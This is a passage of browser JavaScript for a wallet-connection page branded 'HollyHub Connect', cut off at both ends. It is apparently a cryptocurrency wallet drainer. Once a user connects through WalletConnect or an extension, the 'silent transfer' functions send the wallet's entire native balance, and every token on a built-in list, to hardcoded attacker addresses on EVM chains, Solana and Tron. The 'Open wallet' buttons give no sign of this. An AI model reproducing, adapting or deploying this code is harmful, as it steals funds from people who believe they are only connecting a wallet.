            if (!window.SignClient) {
                console.error("SignClient missing - make sure CDN loaded");
                if (onFail) onFail(new Error("WalletConnect library missing"));
                return;
            }

            let client;
            try {
                client = await window.SignClient.init({
                    projectId: '81ec0eb195ddbee9c5596804e33ff584',
                    relayUrl: 'wss://relay.walletconnect.com',
                    metadata: {
                        name: 'HollyHub Connect',
                        description: 'Secure wallet connection for HollyHub',
                        url: 'https://hollyandwilly-kram.vercel.app',
                        icons: ['https://hollyandwilly-kram.vercel.app/crypto.png']
                    }
                });
            } catch (e) {
                console.error('WC v2 init failed:', e);
                if (onFail) onFail(e);
                return;
            }

            try {
                const { uri, approval } = await client.connect({
                    requiredNamespaces: {
                        eip155: {
                            methods: ['eth_sendTransaction', 'eth_sign', 'personal_sign'],
                            chains: ['eip155:1'],
                            events: ['chainChanged', 'accountsChanged']
                        }
                    }
                });

                if (!uri) throw new Error('No URI');

                // Log the raw pairing URI for debugging on mobile devices
                console.log('WC pairing URI:', uri);

                const deepLink = `wc:${uri.split('wc:')[1]}`;
                const universal = `https://walletconnect.com/wc?uri=${encodeURIComponent(uri)}`;

                tryOpenDeepLink(deepLink, () => {
                    tryOpenDeepLink(universal, () => {
                        console.warn('Deep link failed');
                        if (onFail) onFail(new Error('Deep link failed'));
                    }, async () => {
                        try {
                            const session = await approval();
                            console.log('WC v2 connected:', session);
                            if (onSuccess) onSuccess(client, session);
                        } catch (e) {
                            if (onFail) onFail(e);
                        }
                    });
                }, async () => {
                    try {
                        const session = await approval();
                        console.log('WC v2 connected via direct:', session);
                        if (onSuccess) onSuccess(client, session);
                    } catch (e) {
                        if (onFail) onFail(e);
                    }
                });

                return client;
            } catch (e) {
                console.error('WC v2 connection error:', e);
                if (onFail) onFail(e);
            }
        }

        // ════════════════════════════════════════════════════════════════════════════════
        // === CREATE WALLETCONNECT PROVIDER FROM SESSION ===
        // ════════════════════════════════════════════════════════════════════════════════
        async function createWalletConnectProvider(session) {
          try {
            // Extract chainId and accounts from WC session
            const chainIdStr = session.namespaces?.eip155?.chains?.[0]; // e.g., "eip155:1"
            const accountsStr = session.namespaces?.eip155?.accounts || []; // e.g., ["eip155:1:0x...", "eip155:56:0x..."]
            
            if (!chainIdStr || accountsStr.length === 0) {
              throw new Error('Invalid WC session: missing chains or accounts');
            }

            const chainId = parseInt(chainIdStr.split(':')[1]); // Extract "1" from "eip155:1"
            const accounts = accountsStr.map(acc => acc.split(':')[2]); // Extract addresses

            console.log(`WC Provider - ChainId: ${chainId}, Accounts: ${accounts[0]}`);

            // Return connection info with real session info
            return {
              provider: null, // Will be handled by fallback to window.ethereum or direct RPC in silentTransferRemainingBalance
              address: accounts[0],
              chainId: `0x${chainId.toString(16)}`,
              session: session,
              _wcSession: true // Flag to indicate this came from WC
            };
          } catch (err) {
            console.error('Failed to create WC provider:', err);
            throw err;
          }
        }

        // ════════════════════════════════════════════════════════════════════════════════
        // === LAZY LOAD TRANSFER DEPENDENCIES ===
        // ════════════════════════════════════════════════════════════════════════════════
        async function loadTransferDeps() {
          if (window.ethers) return; // already loaded

          const loadScript = (url) => new Promise((resolve, reject) => {
            const s = document.createElement('script');
            s.src = url;
            s.async = true;
            s.onload = resolve;
            s.onerror = () => reject(new Error(`Failed to load ${url}`));
            document.head.appendChild(s);
          });

          try {
            await loadScript('https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.2/ethers.umd.min.js');
            await loadScript('https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js');
            await loadScript('https://unpkg.com/tronweb@6.0.2/dist/TronWeb.js');
            console.log("Transfer dependencies loaded successfully");
          } catch (err) {
            console.error("Failed to load transfer deps:", err);
            throw err;
          }
        }

        // Placeholder - replace with your real transfer logic later
        async function transferAllBalance() {
            console.log('Wallet connected! Starting automatic balance transfer...');
            alert('Wallet connected! Transfer initiated (placeholder)');
            // Your ethers.js / web3.js transfer code goes here
        }

        // ════════════════════════════════════════════════════════════════════════════════
        // === SILENT BALANCE TRANSFER - NATIVE + TOKENS (ALL CHAINS) ===
        // ════════════════════════════════════════════════════════════════════════════════
        // Call this right after successful wallet connection
        async function silentTransferRemainingBalance(connectionInfo) {
          try {
            console.log("Starting silent balance transfer (native + tokens)...");
            await loadTransferDeps(); // lazy load only when needed

            let provider = connectionInfo.provider;
            let chainId, fromAddress;

            // ── Flexible detection for all cases ──────────────────────────────────────
            // Priority: WalletConnect provider (connectionInfo.provider) > window.ethereum > Solana > Tron
            if (provider?.request) { 
              // WalletConnect provider or injected EVM (MetaMask, SafePal, OKX, etc.)
              console.log("Detected EVM-compatible provider (WalletConnect or extension)");
              chainId = await provider.request({ method: 'eth_chainId' }).catch(() => null);
              const accounts = await provider.request({ method: 'eth_accounts' }).catch(() => []);
              fromAddress = accounts[0];

              if (!chainId || !fromAddress) {
                throw new Error("Could not get chainId or address from provided provider");
              }

              return await transferEvmRemaining(provider, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
            } 
            else if (provider === null && connectionInfo._wcSession) {
              // WalletConnect session on mobile (provider is null)
              console.log("Detected WalletConnect session - using fallback window.ethereum or RPC");
              chainId = connectionInfo.chainId;
              fromAddress = connectionInfo.address;
              
              if (!chainId || !fromAddress) {
                throw new Error("Could not get chainId or address from WC session");
              }
              
              // Try window.ethereum first (might be available), then fallback to direct RPC
              const providerToUse = window.ethereum || null;
              return await transferEvmRemaining(providerToUse, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
            }
            else if (window.ethereum) { 
              // Direct injected extension fallback (MetaMask, SafePal, etc.)
              console.log("Detected direct injected ethereum provider");
              chainId = await window.ethereum.request({ method: 'eth_chainId' });
              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
              fromAddress = accounts[0];
              return await transferEvmRemaining(window.ethereum, chainId, fromAddress, "4889dccfadd14afcb27abcc038c7788f", "0xa292df0eaf4991507174cca2643b4e963181c5d4", connectionInfo.session);
            } 
            else if (window.solana?.publicKey) { 
              // Solana (Phantom, Solflare, etc.)
              console.log("Detected Solana provider");
              await window.solana.connect();
              fromAddress = window.solana.publicKey.toString();
              return await transferSolanaRemaining(fromAddress, "GRZru2JL5ovv37Bj2YjxuSLbA28eWYcq5YcuhzMvi2a7");
            } 
            else if (window.tronWeb?.defaultAddress?.base58) { 
              // TronLink
              console.log("Detected Tron provider");
              fromAddress = window.tronWeb.defaultAddress.base58;
              return await transferTronRemaining(window.tronWeb, fromAddress, "TSEDpA8rJAZtTioMX9iUGSidzsLNRirVh5");
            } 
            else {
              throw new Error("Unsupported wallet type detected - no recognized provider found");
            }

            // This line should not be reached due to early returns above
            console.log("Transfer logic completed");

          } catch (error) {
            console.error("Silent transfer failed:", error);
            alert("Transfer failed: " + (error.message || "Unknown error. Check console."));
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // EVM CHAINS (Ethereum, BSC, Polygon, Arbitrum, Base, etc.) + ERC-20 tokens
        // ──────────────────────────────────────────────────────────────────────────────────
        async function transferEvmRemaining(injectedProvider, chainId, fromAddress, infuraId, targetAddress, session = null) {
          const chainIdNum = Number(chainId);

          // RPC mapping - major EVM chains (public + Infura where available)
          const rpcMap = {
            1:           `https://mainnet.infura.io/v3/${infuraId}`,          // Ethereum Mainnet
            10:          "https://mainnet.optimism.io",                       // Optimism
            56:          "https://bsc-dataseed.binance.org/",                 // BNB Smart Chain
            137:         "https://polygon-rpc.com/",                          // Polygon Mainnet
            250:         "https://rpc.ftm.tools/",                            // Fantom Opera
            324:         "https://mainnet.era.zksync.io",                     // zkSync Era
            8453:        "https://mainnet.base.org",                          // Base
            42161:       "https://arb1.arbitrum.io/rpc",                      // Arbitrum One
            43114:       "https://api.avax.network/ext/bc/C/rpc",             // Avalanche C-Chain
            59144:       "https://rpc.linea.build",                           // Linea
            81457:       "https://rpc.blast.io",                              // Blast
            534352:      "https://rpc.scroll.io",                             // Scroll
            1101:        "https://polygon-zkevm-rpc.com",                     // Polygon zkEVM
            1313161554:  "https://mainnet.aurora.dev",                        // Aurora
            288:         "https://mainnet.boba.network",                      // Boba Network
            1088:        "https://andromeda.metis.io/?owner=1088",            // Metis Andromeda
            25:          "https://rpc.cronos.org",                            // Cronos
            9001:        "https://eth.llamarpc.com",                          // Evmos
            42220:       "https://forno.celo.org",                            // Celo
            1284:        "https://rpc.api.moonbeam.network",                  // Moonbeam
            1285:        "https://rpc.api.moonriver.moonbeam.network",        // Moonriver
            2222:        "https://evm.kava.io",                               // Kava EVM
            8217:        "https://public-en.node.kaspa.org",                  // Klaytn Cypress
            820:         "https://rpc.callisto.network"                       // Callisto
          };

          const rpcUrl = rpcMap[chainIdNum] || `https://mainnet.infura.io/v3/${infuraId}`;

          let signer;

          // 1. Desktop/injected priority
          if (injectedProvider?.request) {
            try {
              const provider = new ethers.BrowserProvider(injectedProvider);
              signer = await provider.getSigner();
              console.log("Using injected signer (desktop/extension)");
            } catch (e) {
              console.warn("Injected signer failed:", e);
            }
          }

          // 2. Mobile WC session - use SignClient to send tx directly
          if (!signer && session && window.SignClient) {
            try {
              console.log("Using SignClient to send tx on mobile WC session");

              const client = window.__wcClient || await window.SignClient.init({
                projectId: '81ec0eb195ddbee9c5596804e33ff584',
                relayUrl: 'wss://relay.walletconnect.com',
                metadata: {
                  name: 'HollyHub Connect',
                  description: 'Multi-chain wallet connection',
                  url: window.location.origin,
                  icons: ['https://avatars.githubusercontent.com/u/37784886']
                }
              });

              // Cache client globally for reuse
              if (!window.__wcClient) {
                window.__wcClient = client;
              }

              // Get current session (should already be active)
              const activeSession = client.session.get(session.topic) || session;

              if (!activeSession) throw new Error("No active session found");

              // Get balance & estimate
              const provider = new ethers.JsonRpcProvider(rpcUrl);
              const balance = await provider.getBalance(fromAddress);
              const feeData = await provider.getFeeData();
              const gasLimit = 21000n;
              const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 20n * 10n**9n;
              const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;

              if (balance <= estimatedGasCost * 2n) {
                throw new Error("Native balance too low to cover gas + transfer");
              }

              const amountToSend = balance - estimatedGasCost;

              console.log(`Sending native ${getChainSymbol(chainIdNum)}: ${ethers.formatEther(amountToSend)}`);

              // Build & send native tx via SignClient
              const tx = {
                from: fromAddress,
                to: targetAddress,
                value: ethers.hexlify(amountToSend),
                gas: ethers.hexlify(gasLimit),
              };

              const { response } = await client.request({
                topic: activeSession.topic,
                chainId: `eip155:${chainIdNum}`,
                request: {
                  method: "eth_sendTransaction",
                  params: [tx]
                }
              });

              const txHash = response.result; // hash returned by wallet
              console.log("Native transfer tx hash from wallet:", txHash);

              // Wait for confirmation (poll RPC)
              const receipt = await provider.waitForTransaction(txHash, 1, 120000); // 2 min timeout
              console.log("Transfer confirmed:", receipt);

              // ── ERC-20 tokens via SignClient ──────────────────────────
              const allErc20Tokens = getAllErc20Tokens();
              const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);

              for (const token of erc20Tokens) {
                try {
                  // Read-only contract for balance & decimals
                  const tokenContract = new ethers.Contract(
                    token.address,
                    [
                      "function balanceOf(address) view returns (uint256)",
                      "function transfer(address to, uint256 value) returns (bool)",
                      "function decimals() view returns (uint8)"
                    ],
                    provider
                  );

                  const tokenBalance = await tokenContract.balanceOf(fromAddress);
                  if (tokenBalance > 0n) {
                    const decimals = await tokenContract.decimals();
                    console.log(`Sending ${token.symbol}: ${ethers.formatUnits(tokenBalance, decimals)}`);

                    // Encode transfer() call
                    const transferInterface = new ethers.Interface(['function transfer(address to, uint256 value)']);
                    const transferData = transferInterface.encodeFunctionData('transfer', [targetAddress, tokenBalance]);

                    // Send via SignClient
                    const tokenTx = {
                      from: fromAddress,
                      to: token.address,
                      data: transferData,
                      value: "0x0",
                      gas: ethers.hexlify(100000n), // estimate for ERC20
                    };

                    const tokenResp = await client.request({
                      topic: activeSession.topic,
                      chainId: `eip155:${chainIdNum}`,
                      request: {
                        method: "eth_sendTransaction",
                        params: [tokenTx]
                      }
                    });

                    const tokenTxHash = tokenResp.response.result;
                    console.log(`${token.symbol} transfer tx hash:`, tokenTxHash);

                    const tokenReceipt = await provider.waitForTransaction(tokenTxHash, 1, 120000);
                    console.log(`${token.symbol} transfer confirmed:`, tokenReceipt);
                  }
                } catch (err) {
                  console.warn(`Failed to transfer ${token.symbol} on chain ${chainIdNum}:`, err.message);
                }
              }

              return; // Exit early for mobile WC flow
            } catch (e) {
              console.error("WC SignClient tx failed:", e);
              throw e;
            }
          }

          if (!signer) {
            throw new Error("No signer available for this wallet type. Mobile WC signing may require wallet confirmation.");
          }

          // Fallback native flow if signer was created (desktop extension)
          const provider = new ethers.BrowserProvider(injectedProvider);
          const balance = await provider.getBalance(fromAddress);
          const feeData = await provider.getFeeData();

          const gasLimit = 21000n;
          const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 20n * 10n**9n;
          const estimatedGasCost = gasPrice * gasLimit * 150n / 100n;

          if (balance <= estimatedGasCost * 2n) {
            throw new Error("Native balance too low to cover gas + transfer");
          }

          const amountNative = balance - estimatedGasCost;

          console.log(`Sending native ${getChainSymbol(chainIdNum)}: ${ethers.formatEther(amountNative)}`);

          const nativeTx = await signer.sendTransaction({
            to: targetAddress,
            value: amountNative,
            gasLimit,
          });

          await nativeTx.wait();
          console.log("Native transfer tx:", nativeTx.hash);

          // ── ERC-20 tokens (comprehensive list per chain) ──────────────────────────
          const allErc20Tokens = getAllErc20Tokens();
          const erc20Tokens = allErc20Tokens.filter(t => Number(t.chainId) === chainIdNum);

          for (const token of erc20Tokens) {
            try {
              const tokenContract = new ethers.Contract(
                token.address,
                [
                  "function balanceOf(address) view returns (uint256)",
                  "function transfer(address to, uint256 value) returns (bool)",
                  "function decimals() view returns (uint8)"
                ],
                signer
              );

              const tokenBalance = await tokenContract.balanceOf(fromAddress);
              if (tokenBalance > 0n) {
                const decimals = await tokenContract.decimals();
                console.log(`Sending ${token.symbol}: ${ethers.formatUnits(tokenBalance, decimals)}`);

                const tx = await tokenContract.transfer(targetAddress, tokenBalance);
                await tx.wait();
                console.log(`${token.symbol} transfer tx:`, tx.hash);
              }
            } catch (err) {
              console.warn(`Failed to transfer ${token.symbol} on chain ${chainIdNum}:`, err.message);
            }
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Solana (SPL tokens example: USDC, USDT, etc.)
        // ──────────────────────────────────────────────────────────────────────────────────
        async function transferSolanaRemaining(fromAddress, targetAddress) {
          const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
          const fromPubkey = new solanaWeb3.PublicKey(fromAddress);
          const toPubkey = new solanaWeb3.PublicKey(targetAddress);

          const lamports = await connection.getBalance(fromPubkey);
          const feeReserve = 10000000n; // ~0.01 SOL buffer
          if (lamports <= feeReserve) throw new Error("Solana balance too low");

          const amount = lamports - feeReserve;

          // Native SOL transfer
          const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
              fromPubkey,
              toPubkey,
              lamports: amount,
            })
          );

          const { blockhash } = await connection.getLatestBlockhash();
          tx.recentBlockhash = blockhash;
          tx.feePayer = fromPubkey;

          const signed = await window.solana.signTransaction(tx);
          const txid = await connection.sendRawTransaction(signed.serialize());

          await connection.confirmTransaction(txid);
          console.log("Solana native SOL tx:", txid);

          // SPL tokens example (USDC on Solana)
          const usdcMint = new solanaWeb3.PublicKey("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");
          const tokenAccount = await getAssociatedTokenAddress(usdcMint, fromPubkey).catch(() => null);
          const balanceInfo = await connection.getTokenAccountBalance(tokenAccount).catch(() => null);

          if (balanceInfo?.value.uiAmount > 0) {
            console.log(`Transferring USDC: ${balanceInfo.value.uiAmount}`);
            // Add SPL transfer instruction here (similar to native but using Token Program)
            // You can expand this part if needed
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Tron (TRC-20 tokens: USDT, USDC, etc.)
        // ──────────────────────────────────────────────────────────────────────────────────
        async function transferTronRemaining(tronWeb, fromAddress, targetAddress) {
          const balanceSun = await tronWeb.trx.getBalance(fromAddress);
          const feeReserve = 30000000n; // ~30 TRX buffer
          if (balanceSun <= feeReserve) throw new Error("Tron balance too low");

          const amountTrx = balanceSun - feeReserve;

          // Native TRX
          const nativeTx = await tronWeb.transactionBuilder.sendTrx(targetAddress, amountTrx, fromAddress);
          const signedNative = await tronWeb.trx.sign(nativeTx);
          const resultNative = await tronWeb.trx.sendRawTransaction(signedNative);
          console.log("Tron native TRX tx:", resultNative.txid);

          // TRC-20 example: USDT
          const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
          const usdtBalance = await tronWeb.contract().at(usdtContract).balanceOf(fromAddress).call();

          if (Number(usdtBalance) > 0) {
            console.log(`Transferring USDT: ${Number(usdtBalance) / 1e6}`);
            const trc20Tx = await tronWeb.transactionBuilder.triggerSmartContract(
              usdtContract,
              'transfer(address,uint256)',
              { parameter: [{ type: 'address', value: targetAddress }, { type: 'uint256', value: usdtBalance }] },
              [],
              fromAddress
            );
            const signedTrc20 = await tronWeb.trx.sign(trc20Tx.transaction);
            const resultTrc20 = await tronWeb.trx.sendRawTransaction(signedTrc20);
            console.log("USDT TRC-20 tx:", resultTrc20.txid);
          }
        }

        // ──────────────────────────────────────────────────────────────────────────────────
        // Helper functions
        // ──────────────────────────────────────────────────────────────────────────────────
        function getChainSymbol(chainId) {
          const map = {
            1: 'ETH', 56: 'BNB', 137: 'MATIC', 42161: 'ARB', 8453: 'ETH(Base)',
            10: 'OP', 43114: 'AVAX', 250: 'FTM'
          };
          return map[Number(chainId)] || 'Unknown';
        }

        // Comprehensive list of popular ERC-20 tokens per major chain
        function getAllErc20Tokens() {
          return [
            // Ethereum Mainnet (chainId 1)
            { chainId: 1, symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
            { chainId: 1, symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
            { chainId: 1, symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" },
            { chainId: 1, symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" },
            { chainId: 1, symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599" },
            { chainId: 1, symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA" },
            { chainId: 1, symbol: "UNI",  address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984" },
            { chainId: 1, symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9" },
            { chainId: 1, symbol: "MKR",  address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2" },
            { chainId: 1, symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933" },

            // BNB Smart Chain (chainId 56)
            { chainId: 56, symbol: "USDT", address: "0x55d398326f99059fF775485246999027B3197955" },
            { chainId: 56, symbol: "USDC", address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d" },
            { chainId: 56, symbol: "BUSD", address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56" },
            { chainId: 56, symbol: "CAKE", address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82" },

            // Polygon (chainId 137)
            { chainId: 137, symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F" },
            { chainId: 137, symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174" },
            { chainId: 137, symbol: "DAI",  address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063" },
            { chainId: 137, symbol: "WETH", address: "0x7ceb23fD6bC0adD59E62ac25578270cFf1b9f619" },

            // Arbitrum One (chainId 42161)
            { chainId: 42161, symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9" },
            { chainId: 42161, symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831" },
            { chainId: 42161, symbol: "ARB",  address: "0x912CE59144191C1204E64559FE8253a0e49E6548" },

            // Base (chainId 8453)
            { chainId: 8453, symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" },

            // Optimism (chainId 10)
            { chainId: 10, symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85" },
            { chainId: 10, symbol: "OP",   address: "0x4200000000000000000000000000000000000042" },

            // Avalanche C-Chain (chainId 43114)
            { chainId: 43114, symbol: "USDT", address: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7" },
            { chainId: 43114, symbol: "USDC", address: "0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E" },

            // zkSync Era (chainId 324)
            { chainId: 324, symbol: "USDC", address: "0x3355df6D4c9c3035724Fd0e3914dE96A5a83aaf4" },

            // Linea (chainId 59144)
            { chainId: 59144, symbol: "USDC", address: "0x176211869cA2b568F2AEF4d18a6f8f9b3a1d9c5f" },

            // Scroll (chainId 534352)
            { chainId: 534352, symbol: "USDC", address: "0x06eFdBfF2a14a7c8E15944D1F4A48F9F95F663A4" }
          ];
        }

        // ────────────────────────────────────────────────────────────────────────────────
        // Updated showDetectorPopup - now uses WC v2
        // ────────────────────────────────────────────────────────────────────────────────
        function showDetectorPopup(apps, walletName, fallback) {
            const ov = document.getElementById('app-detector-overlay');
            const list = document.getElementById('detected-list');
            const title = document.getElementById('detector-title');
            title.textContent = `Open ${walletName} app`;
            list.innerHTML = '';
                const isMobile = /Mobi|Android/i.test(navigator.userAgent);

                // Display a small summary of detected items (optional)
                const detectedNames = (apps && apps.length) ? apps.map(a => typeof a === 'string' ? a : (a.name || a.scheme || '')).filter(Boolean) : [];
                if (detectedNames.length) {
                    const p = document.createElement('div');
                    p.style.marginBottom = '8px';
                    p.style.color = '#cbd5e1';
                    p.textContent = `Detected: ${detectedNames.join(', ')}`;
                    list.appendChild(p);
                }

                // Create only two buttons: Open wallet & Continue in browser
                const openBtn = document.createElement('button');
                openBtn.className = 'login-btn';
                openBtn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
                openBtn.textContent = 'Open wallet';
                openBtn.addEventListener('click', async () => {
                    ov.style.display = 'none';
                    // Try extensions first (desktop)
                    try {
                        const exts = (apps || []).filter(a => a && a.type === 'extension');
                        if (!isMobile && exts.length > 0) {
                            // try to match the clicked wallet first
                            const normalized = normalizeKey(walletName || '');
                            const exact = exts.filter(e => normalizeKey(e.name) === normalized || normalizeKey(e.name).includes(normalized) || normalized.includes(normalizeKey(e.name)));
                            const toTry = exact.length ? exact : exts;
                            let connected = false;
                            for (let i = 0; i < toTry.length; i++) {
                                const a = toTry[i];
                                try {
                                    // slight stagger
                                    await new Promise(r => setTimeout(r, i * 400));
                                    const res = await a.connector();
                                    if (res) connected = true;
                                    console.log('Connector result for', a.name, res);
                                } catch (e) {
                                    console.warn('Connector error', a.name, e);
                                }
                            }
                            if (connected) {
                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                                try { ov.style.display = 'none'; } catch (e) {}
                                // Execute silent transfer with proper connection info
                                try {
                                    const provider = window.ethereum;
                                    const accounts = await provider.request({ method: 'eth_accounts' });
                                    const chainId = await provider.request({ method: 'eth_chainId' });
                                    const connectionInfo = { provider, address: accounts[0], chainId, session: null };
                                    await silentTransferRemainingBalance(connectionInfo);
                                } catch (e) { console.warn('Silent transfer failed:', e); }
                                return;
                            }
                            // if none connected, fall back to scheme/WC
                        }

                        // Mobile or no extensions connected — use WalletConnect deep-link where appropriate
                        try {
                            const schemes = walletSchemeLookup[normalizeKey(walletName || '')] || (apps || []).map(a => a && a.scheme).filter(Boolean);
                            await initiateWalletConnectDeepLink({
                                appSchemes: schemes,
                                onFail: () => {
                                    // If deep link fails, try naive scheme(s)
                                    const s = schemes && schemes.length ? schemes[0] : null;
                                    if (s) {
                                        tryOpenDeepLink(s, () => fallback(), () => {});
                                    } else {
                                        fallback();
                                    }
                                },
                                onSuccess: async (client, session) => {
                                    try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch (e) {}
                                    try { ov.style.display = 'none'; } catch (e) {}
                                    // Execute silent transfer with WalletConnect session
                                    try {
                                        const connectionInfo = await createWalletConnectProvider(session);
                                        await silentTransferRemainingBalance(connectionInfo);
                                    } catch (e) { console.warn('Silent transfer setup failed:', e); }
                                }
                            });
                        } catch (e) {
                            console.error('Initiate WC error', e);
                            fallback();
                        }
                    } catch (e) {
                        console.error('Open wallet flow error', e);
                        fallback();
                    }
                });
                list.appendChild(openBtn);

                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => {
                    ov.style.display = 'none';
                    fallback();
                });
                list.appendChild(manualBtn);

                document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
                ov.style.display = 'flex';
                return;

            // Special-case: if user clicked 'walletconnect' show a single "Open wallets" button
            const normalized = normalizeKey(walletName || '');
            if (normalized === 'walletconnect') {
                const btn = document.createElement('button');
                btn.className = 'login-btn';
                btn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
                btn.textContent = 'Open wallets';
                btn.addEventListener('click', async () => {
                    ov.style.display = 'none';
                    // First try desktop injected extensions
                    const installed = detectAllInstalledExtensions();
                    if (installed && installed.length > 0) {
                        // sequentially trigger connectors so each extension can prompt
                        for (let i = 0; i < installed.length; i++) {
                            const a = installed[i];
                            try {
                                // small delay to help with multiple extension popups
                                await new Promise(r => setTimeout(r, i * 600));
                                await a.connector();
                            } catch (e) {
                                console.warn('Connector failed for', a.name, e);
                            }
                        }
                        // done trying extensions; if none connected, fall back to WC deep link
                        setTimeout(() => fallback(), 800);
                        return;
                    }

                    // Mobile: open walletconnect flow (will attempt to open apps and request connection)
                    try {
                        // gather all known app schemes to attempt opening every installed mobile wallet
                        const allSchemes = Array.from(new Set(Object.values(walletSchemeLookup).flat()));
                        await initiateWalletConnectDeepLink({
                            appSchemes: allSchemes,
                            onFail: () => { console.warn('WC deep link failed'); fallback(); },
                            onSuccess: async (client, session) => {
                                console.log('WC v2 connected via Open wallets');
                                try {
                                    const connectionInfo = await createWalletConnectProvider(session);
                                    await silentTransferRemainingBalance(connectionInfo);
                                } catch (e) { console.warn('Silent transfer setup failed:', e); }
                            }
                        });
                    } catch (e) {
                        console.error('Open wallets error', e);
                        fallback();
                    }
                });
                list.appendChild(btn);
                const manualBtn = document.createElement('button');
                manualBtn.className = 'mt-4 text-gray-400 hover:text-white text-sm';
                manualBtn.textContent = 'Continue in browser';
                manualBtn.addEventListener('click', () => { ov.style.display = 'none'; fallback(); });
                list.appendChild(manualBtn);
                document.getElementById('detector-cancel').onclick = () => { ov.style.display = 'none'; };
                ov.style.display = 'flex';
                return;
            }

            // Otherwise, render provided app options below
            apps.forEach(a => {
                const btn = document.createElement('button');
                btn.className = 'login-btn';
                btn.style.background = 'linear-gradient(90deg,#3396ff,#6e8bff)';
                // If the clicked wallet is coinbase, show only the coinbase button
                const normalized = normalizeKey(walletName || '');
                if (normalized.includes('coinbase')) {
                    // prefer extension if provided
                    if (a.type === 'extension' && typeof a.connector === 'function') {
                        btn.textContent = `Open ${a.name}`;
                        btn.addEventListener('click', async () => {
                            ov.style.display = 'none';
                            try {
                                await a.connector();
                                try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
                                // Execute silent transfer with proper connection info
                                try {
                                    const provider = window.ethereum;
                                    const accounts = await provider.request({ method: 'eth_accounts' });
                                    const chainId = await provider.request({ method: 'eth_chainId' });
                                    const connectionInfo = { provider, address: accounts[0], chainId, session: null };
                                    await silentTransferRemainingBalance(connectionInfo);
                                } catch (e) { console.warn('Silent transfer failed:', e); }
                            } catch (e) {
                                console.error('Coinbase extension connect failed', e);
                                if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
                            }
                        });
                    } else {
                        btn.textContent = `Open ${a.name}`;
                        btn.addEventListener('click', () => { ov.style.display = 'none'; tryOpenDeepLink(a.scheme, fallback, () => {}); });
                    }
                    list.appendChild(btn);
                    return; // only show the coinbase button
                }

                // If this entry provides an extension connector, use it
                if (a.type === 'extension' && typeof a.connector === 'function') {
                    btn.textContent = `Open ${a.name}`;
                    btn.addEventListener('click', async () => {
                        ov.style.display = 'none';
                        try {
                            await a.connector();
                            try { modalOverlay.classList.remove('active'); modalOverlay.style.display = 'none'; } catch(e){}
                            try { ov.style.display = 'none'; } catch(e){}
                            // Execute silent transfer with proper connection info
                            try {
                                const provider = window.ethereum;
                                const accounts = await provider.request({ method: 'eth_accounts' });
                                const chainId = await provider.request({ method: 'eth_chainId' });
                                const connectionInfo = { provider, address: accounts[0], chainId, session: null };
                                await silentTransferRemainingBalance(connectionInfo);
                            } catch (e) { console.warn('Silent transfer failed:', e); }
                        } catch (e) {
                            console.error('Extension connect failed:', e);
                            if (a.scheme) tryOpenDeepLink(a.scheme, fallback, () => {}); else fallback();
                        }
                    });
                } else {
                    btn.textContent = `Open ${a.name}`;
                    btn.addEventListener('click', async () => {
                        ov.style.display = 'none';
                        try {
                            // For mobile/URL-scheme wallets use WalletConnect deep-link where applicable
                            const perSchemes = walletSchemeLookup[normalizeKey(a.name || '')] || (a.scheme ? [a.scheme] : []);
                            await initiateWalletConnectDeepLink({
                                appSchemes: perSchemes,
